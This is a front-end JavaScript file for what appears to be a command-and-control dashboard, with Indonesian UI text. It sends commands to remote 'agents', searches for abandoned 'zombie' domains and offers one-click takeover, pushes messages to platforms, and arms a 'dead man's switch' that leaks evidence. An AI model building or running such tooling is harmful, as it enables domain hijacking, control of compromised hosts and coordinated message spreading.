// commander.js
let agents = [];
let zombieResults = [];

// Saat halaman load
window.onload = function() {
  loadAgents();
  loadIntelFeed();
};

// 1. Load Agents
function loadAgents() {
  fetch('/api/agents')
    .then(r => r.json())
    .then(data => {
      agents = data;
      const select = document.getElementById('agent-select');
      select.innerHTML = '<option value="">Pilih Agent</option>';
      data.forEach(a => {
        const opt = document.createElement('option');
        opt.value = a.id;
        opt.textContent = `${a.id} (${a.location})`;
        select.appendChild(opt);
      });
    });
}

function loadAgentDetails() {
  const id = document.getElementById('agent-select').value;
  const details = document.getElementById('agent-details');
  if (!id) {
    details.innerHTML = '';
    return;
  }
  const agent = agents.find(a => a.id === id);
  details.innerHTML = `
    <p><b>Status:</b> ${agent.online ? '🟢 Online' : '🔴 Offline'}</p>
    <p><b>IP:</b> ${agent.ip}</p>
    <p><b>DSI:</b> ${agent.dsi}/100</p>
    <p><b>Role:</b> ${agent.role}</p>
  `;
}

// 2. Kirim Perintah ke Agent
function sendCommand(cmd) {
  const agentId = document.getElementById('agent-select').value;
  if (!agentId) {
    alert("Pilih agent dulu!");
    return;
  }
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ agent_id: agentId, command: cmd })
  }).then(() => alert(`Perintah "${cmd}" dikirim ke ${agentId}`));
}

// 3. Zombie Hunter
function huntZombie() {
  const keyword = document.getElementById('keyword').value;
  if (!keyword) return;
  fetch(`/api/zombie?keyword=${keyword}`)
    .then(r => r.json())
    .then(data => {
      zombieResults = data;
      const div = document.getElementById('zombie-results');
      div.innerHTML = data.map(z => `
        <div class="zombie-item">
          <b>${z.domain}</b> (${z.type})<br>
          <small>${z.url}</small><br>
          <button onclick="takeover('${z.domain}')">🧟 Ambil Alaih</button>
        </div>
      `).join('');
    });
}

function takeover(domain) {
  if (confirm(`Ambil alih ${domain}?`)) {
    fetch('/api/takeover', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domain })
    }).then(() => alert(`Zombie ${domain} berhasil diambil alih!`));
  }
}

// 4. Amplify
function amplifyTo(platform) {
  const msg = document.getElementById('amplify-msg').value;
  if (!msg) return;
  fetch('/api/amplify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: msg, platform })
  }).then(() => alert(`Disebar ke ${platform}!`));
}

// 5. Modal: Dead Man's Switch
function openModal() {
  document.getElementById('switch-modal').style.display = 'block';
}
function closeModal() {
  document.getElementById('switch-modal').style.display = 'none';
}
function activateSwitch() {
  fetch('/api/deadman/activate', { method: 'POST' })
    .then(() => {
      alert("DEAD MAN'S SWITCH AKTIF. SEMUA BUKTI AKAN DISEBAR JIKA KAMU TIDAK AKTIF.");
      closeModal();
    });
}

// 6. Intel Feed
function loadIntelFeed() {
  setInterval(() => {
    fetch('/api/intel')
      .then(r => r.json())
      .then(data => {
        const feed = document.getElementById('intel-feed');
        feed.innerHTML = data.slice(0, 5).map(i => 
          `<p>⚠️ ${i.type}: ${i.message}</p>`
        ).join('');
      });
  }, 10000);
}